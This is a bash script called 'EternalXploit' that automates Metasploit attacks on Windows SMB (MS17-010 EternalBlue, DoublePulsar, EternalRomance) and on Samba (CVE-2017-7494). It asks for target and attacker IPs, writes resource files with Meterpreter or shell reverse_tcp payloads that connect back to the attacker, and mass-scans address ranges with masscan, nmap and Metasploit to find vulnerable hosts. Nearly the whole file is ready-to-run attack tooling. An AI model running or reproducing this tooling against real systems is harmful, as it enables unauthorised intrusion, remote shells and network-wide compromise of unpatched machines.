#!/bin/bash
# Eternal Xploit Logo
logo() {
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$green"'     Naval Intelligence and Security Force     '"$red"  '###'
echo -e "$red"'            ###' "$green"'     ********** Philippine Navy **********     '"$red"  '###'
echo -e "$red"'            ###' "$green"' Vulnerability Assesstment Penetration Testing '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$red"'                    COd3d By: Gl33ch3r     '"$green"'Version: ' "$yellow"'1.0'
echo -e "$white"
}
defdir="/root/EternalXploit"
msflogs="msflogs.logs"
vulnos="vulnos.txt"
vuln2os="vuln2os.txt"
vulnostmp="vulnostmp.txt"
getdata(){
rm -f "$defdir/$vulnos" >/dev/null 2>&1
vuln1=$(cat $defdir/$msflogs | grep "MS17-010" | awk '{print$2}' | sed -n 1p)
vuln2=$(cat $defdir/$msflogs | grep "MS17-010" | awk '{$1=$3=$4=$5=$6=$7=$8=$9=""; print $0}')
if [ -z "$vuln1" ]
then
echo ""
echo -e "$red" "No vulnerable targets were detected from the list "
delf
else
if [ ! -f "$defdir/$vulnos" ]
then
echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
echo "$vuln2" >> "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vulnos 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
else
echo "$vuln2" > "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp >> $defdir/$vulnos 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
fi
rm -f "$defdir/$msflogs" >/dev/null 2>&1
lm=$(cat $defdir/$vulnos | wc -l)
echo ""
echo -e "$green" "$lm Vulnerable ips found"
echo "---------------------------------------"
# Display the positive results
cat "$defdir/$vulnos" | sed -e "s/:445//g"
echo "---------------------------------------"
echo
echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vulnos"
echo
fi
}
getdata2(){
rm -f "$defdir/$vuln2os" >/dev/null 2>&1
vuln1=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{print$2}' | sed -n 1p)
vuln2=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{$1=$3=$4=$5=$6=$7=$8=$9=""; print $0}')
if [ -z "$vuln1" ]
then
echo ""
echo -e "$red" "No vulnerable targets were detected from the list "
delf
else
if [ ! -f "$defdir/$vuln2os" ]
then
echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
echo "$vuln2" >> "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vuln2os 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
else
echo "$vuln2" > "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp >> $defdir/$vuln2os 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
fi
rm -f "$defdir/$msflogs" >/dev/null 2>&1
lm=$(cat $defdir/$vuln2os | wc -l)
echo ""
echo -e "$green" "$lm Vulnerable ips found"
echo "---------------------------------------"
# Display the positive results
cat "$defdir/$vuln2os" | sed -e "s/:445//g"
echo "---------------------------------------"
echo
echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vulnos"
echo
fi
}

# Check Dependency 
checkdep(){
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo -e "$yellow" "Opps , not connected to Internet"
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'            Checking dependencies . . .        '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
apt-get install masscan -y
dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
mkdir -p /root/.wine/drive_c/
apt-get install metasploit-framework
clear
clear
./EternalXploit.sh
}
# Check masscan
which masscan > /dev/null 2>&1
if [ "$?" -eq "1" ]; then
checkdep
fi
# Check Files and Directory 
checkfile(){
cp -r deps/ $dir/
cp -r eternalblue_doublepulsar.rb $dir/
touch config.rc
echo reload_all >> config.rc
echo 'exit' >> config.rc
/etc/init.d/postgresql start
msfconsole -q -r config.rc
/etc/init.d/postgresql stop
rm config.rc
./EternalXploit.sh
}
# Delete temporary files
delf() {
rm -rf "$defdir/temp1.txt" >/dev/null 2>&1
rm -rf "$defdir/temp.txt" >/dev/null 2>&1
rm -f "$defdir/masscan"  >/dev/null 2>&1
rm -f "$defdir/msfip"  >/dev/null 2>&1
rm -f "$defdir/config.rc"  >/dev/null 2>&1
rm -f "$defdir/msflogs.log" >/dev/null 2>&1
rm -f "$path/paused.conf" >/dev/null 2>&1
rm -f "$defdir/pid.tmp" >/dev/null 2>&1
rm -f "$defdir/x$i" >/dev/null 2>&1
rm -f "$defdir/$vulnertmp" >/dev/null 2>&1
rm -f "$defdir/stat" >/dev/null 2>&1
}

red='\e[1;31m'
white='\033[0;37m'        # White
yellow='\033[0;33m'       # Yellow
blue='\033[0;34m'         # Blue
green='\033[0;32m'        # Green
wine32=/usr/lib/wine/wine

dir="/usr/share/metasploit-framework/modules/exploits/windows/smb"
ms17_010_nmap_path="/root/Desktop/MS17_010_nmap.txt"
if [ -e $dir/eternalblue_doublepulsar.rb ] && [ -d $dir/deps/ ]
then
if test -x $wine32; 
then
logo
echo
echo '     Exploits'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' MS17-010 EXPLOIT'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' SAMBA EXPLOIT'
echo
echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Exit'
echo -e "$yellow"
read -p '     Please select exploit: ' opts
if [[ $opts -eq 1 ]] 
then
clear
logo
echo -e "$white"
echo '     Enternal Exploits/Scanner'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Eternalblue Doublepulsar Exploit'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Nmap MS17-010 Eternalblue Scanner'
echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   MS17-010 Eternalblue Scanner'
echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
echo
echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
echo -e "$green"
read -p '     Please select exploit: ' exploit
if [[ $exploit -eq 1 ]]
then
clear
logo
echo
echo -e "$red"'       ****************' "$yellow"'Eternalblue Doublepulsar Exploit'"$red"' ****************'
	echo -e "$white"
	echo '     Exploit targets:'
	echo
   	echo '     Id  Name'
        echo '     --  ----'
        echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"'   Windows XP (all services pack) (x86) (x64)'
        echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"'   Windows Server 2003 SP0 (x86)'
        echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"'   Windows Server 2003 SP1/SP2 (x86)'
        echo -e '     '"$red"'['"$white"'3'"$red"']'"$white"'   Windows Server 2003 (x64)'
        echo -e '     '"$red"'['"$white"'4'"$red"']'"$white"'   Windows Vista (x86)'
        echo -e '     '"$red"'['"$white"'5'"$red"']'"$white"'   Windows Vista (x64)'
        echo -e '     '"$red"'['"$white"'6'"$red"']'"$white"'   Windows Server 2008 (x86)' 
        echo -e '     '"$red"'['"$white"'7'"$red"']'"$white"'   Windows Server 2008 R2 (x86) (x64)'
        echo -e '     '"$red"'['"$white"'8'"$red"']'"$white"'   Windows 7 (all services pack) (x86) (x64)'
	echo -e "$green"
	read -p  '     Please select target: ' target
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Your IP Address: ' ip
echo -e "$white"
echo -e "$yellow"'     Range: '"$green"'0 to 65535'
echo -e "$white"
read -p '     Port for reverse connection: ' port
echo
echo '     Enternal Blue Architecture'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' x86 Architecture'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' x64 Architecture'
echo 
read -p '     Please select architecture: ' arch
echo	
echo '     Enternal Blue Payload'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' Meterpreter'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' Shell'
echo
read -p '     Please select payload: ' cmd
if [[ $cmd -eq 1 ]]
then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
if [[ $arch -eq 1 ]]
then
echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
echo set targetarchitecture x86 >> config.rc
elif [[ $arch -eq 2 ]]
then
echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
echo set targetarchitecture x64 >> config.rc
fi
echo set targer $target >> config.rc
echo set RHOST $iptarget >> config.rc
echo set LHOST $ip >> config.rc
echo set LPORT $port >> config.rc
echo exploit >> config.rc
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r config.rc
/etc/init.d/postgresql stop >/dev/null 2>&1
rm config.rc
clear
./EternalXploit.sh
elif [[ $cmd -eq 2 ]]
then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
if [[ $arch -eq 1 ]]
then
echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
echo set targetarchitecture x86 >> config.rc
elif [[ $arch -eq 2 ]]
then
echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
echo set targetarchitecture x64 >> config.rc
fi
echo set targer $target >> config.rc
echo set RHOST $iptarget >> config.rc
echo set LHOST $ip >> config.rc
echo set LPORT $port >> config.rc
echo exploit >> config.rc
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q config.rc
/etc/init.d/postgresql stop >/dev/null 2>&1
rm config.rc
clear
./EternalXploit.sh
else
echo Invalid option...exiting...
fi
elif [[ $exploit -eq 2 ]]
then
clear
logo
echo
echo -e "$red"'     *** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption'"$red"' ***'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo use exploit/windows/smb/ms17_010_eternalblue > config.rc
echo set RHOST $iptarget >> config.rc
echo exploit >> config.rc
/etc/init.d/postgresql start
msfconsole -q -r config.rc
/etc/init.d/postgresql stop
rm config.rc
clear
./EternalXploit.sh
elif [[ $exploit -eq 3 ]]
then
clear
logo
echo
echo -e "$red"'     *** '"$yellow"'MS17-010 EternalRomance/Synergy/Champion Remote Code Execution'"$red"' ***'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo use exploit/windows/smb/ms17_010_psexec > config.rc
echo set RHOST $iptarget >> config.rc
echo exploit >> config.rc
/etc/init.d/postgresql start
msfconsole -q -r config.rc
/etc/init.d/postgresql stop
rm config.rc
clear
./EternalXploit.sh
elif [[ $exploit -eq 4 ]]
then
clear
logo
echo
echo -e "$red"'     ************************* '"$yellow"'Nmap MS17-010 Scanner'"$red"' **********************'
echo
echo
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
nmap -oN $ms17_010_nmap_path -T4 -v -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 $iptarget
echo
echo -e "$yellow""Nmap MS17-010 result saved to $ms17_010_nmap_path"
echo
echo
./EternalXploit.sh
elif [[ $exploit -eq 5 ]]
then
mass="$defdir/masscan"
delf
clear
logo
echo
echo -e "$red"'     **** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Scanner'"$red"' ****'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
echo
echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
tn=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner started at $tn , Please Wait\033[0m"
rm -rf "$defdir/stat" >/dev/null 2>&1
stat="1"
masscan "$iptarget" -p "445" --rate "500" --output-filename "$mass" >/dev/null 2>&1 
echo ""
tst=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner stopped/finished at $tst \033[0m"
if [ ! -f "$mass" ]
then
echo -e "$yellow" "Scanner results not found"
exit 1
fi
cat "$mass" | grep 'addr=' | awk '{print $3}' | sed -e s/addr=//g |  cut -d '"' -f 2 | tr " " "\n" >$defdir/msfip
msfips="$defdir/msfip"

#check if there was any ip detected with port $port opened
if [ ! -s "$msfips" ]
then
echo
echo -e "$yellow" "   It was not detected in $iptarget any port 445 opened."
./EternalXploit.sh
fi
stat="0"
echo ""
echo -e "$red" "      Checking ips :"
echo -e "$yellow""----------------------------"
echo -e "$green" ""
cat "$defdir/msfip"
echo ""
echo -e "$yellow""----------------------------"
lc=$(cat $defdir/msfip | wc -l)
echo "     Collected $lc ips"
echo -e "$yellow""     Checking if the $lc ips are vulnerable"
sleep 4
echo -e "$green" "    Press CTRL+C (1X ONLY) to stop ips vulnerability check"
echo -e "$green" "    (aborting this process will not verify all ips)"
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo spool $defdir/$msflogs > config.rc
echo use auxiliary/scanner/smb/smb_ms17_010 >> config.rc
paste -sd, "$defdir/msfip"        \
|sed 's/^/set rhosts /; s/,/, /g'  \
>>"config.rc"
echo exploit >> config.rc
echo exit >> config.rc
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r config.rc >/dev/null 2>&1
/etc/init.d/postgresql stop >/dev/null 2>&1
rm config.rc
getdata
elif [[ $exploit -eq 6 ]]
then
mass="$defdir/masscan"
delf
clear
logo
echo
echo -e "$red"'     ****************' "$yellow"'MS17-010 Remote Code Execution Scanner '"$red"'**************'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
echo
echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
tn=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner started at $tn , Please Wait\033[0m"
rm -rf "$defdir/stat" >/dev/null 2>&1
stat="1"
masscan "$iptarget" -p "445" --rate "500" --output-filename "$mass" >/dev/null 2>&1 
echo ""
tst=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner stopped/finished at $tst \033[0m"
if [ ! -f "$mass" ]
then
echo -e "$yellow" "Scanner results not found"
exit 1
fi
cat "$mass" | grep 'addr=' | awk '{print $3}' | sed -e s/addr=//g |  cut -d '"' -f 2 | tr " " "\n" >$defdir/msfip
msfips="$defdir/msfip"

#check if there was any ip detected with port $port opened
if [ ! -s "$msfips" ]
then
echo
echo -e "$yellow""     It was not detected in $iptarget any port 445 opened."
./EternalXploit.sh
fi
stat="0"
echo ""
echo -e "$red" "      Checking ips :"
echo -e "$yellow""----------------------------"
echo -e "$green" ""
cat "$defdir/msfip"
echo ""
echo -e "$yellow""----------------------------"
lc=$(cat $defdir/msfip | wc -l)
echo "     Collected $lc ips"
echo -e "$yellow""     Checking if the $lc ips are vulnerable"
sleep 4
echo -e "$green" "    Press CTRL+C (1X ONLY) to stop ips vulnerability check"
echo -e "$green" "    (aborting this process will not verify all ips)"
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo spool $defdir/$msflogs > config.rc
echo use auxiliary/admin/smb/ms17_010_command >> config.rc
paste -sd, "$defdir/msfip"        \
|sed 's/^/set rhosts /; s/,/, /g'  \
>>"config.rc"
echo exploit >> config.rc
echo exit >> config.rc
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r config.rc >/dev/null 2>&1
/etc/init.d/postgresql stop >/dev/null 2>&1
rm config.rc
getdata2
elif [[ $exploit -eq 0 ]]
then
clear
./EternalXploit.sh
else
clear
echo '   Invalid option...'
./EternalXploit.sh
fi
elif [[ $opts -eq 2 ]] 
then
clear
logo
echo -e "$white"
echo '     Samba Exploit'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' Samba exploit'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' Nmap samba scanner'
echo
echo -e '     '"$red"'['"$white"'0'"$red"']'"$white"' Back'
echo
echo -e "$yellow"
read -p '     Please select exploit: ' exploit
if [[ $exploit -eq 2 ]]
then
clear
logo
echo
echo -e "$red"'       ***********************' "$yellow"'Nmap Samba Scanner '"$red"'***********************'
echo
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
nmap -T4 -v -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $iptarget
./EternalXploit.sh
elif [[ $exploit -eq 1 ]]
then
clear
logo
echo
echo -e "$red"'      **************************' "$yellow"'Samba Exploit'"$red"' **************************'
echo
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch config.rc
echo use exploit/linux/samba/is_known_pipename > config.rc
echo set RHOST $iptarget >> config.rc
echo exploit >> config.rc
echo exit >> config.rc
/etc/init.d/postgresql start
msfconsole -q -r config.rc
/etc/init.d/postgresql stop
rm config.rc
clear
./EternalXploit.sh
elif [[ $exploit -eq 0 ]]
then
clear
./EternalXploit.sh
fi
elif [[ $opts -eq 0 ]] 
then
clear
exit
fi
else
logo
checkdep
fi
else
checkfile
fi

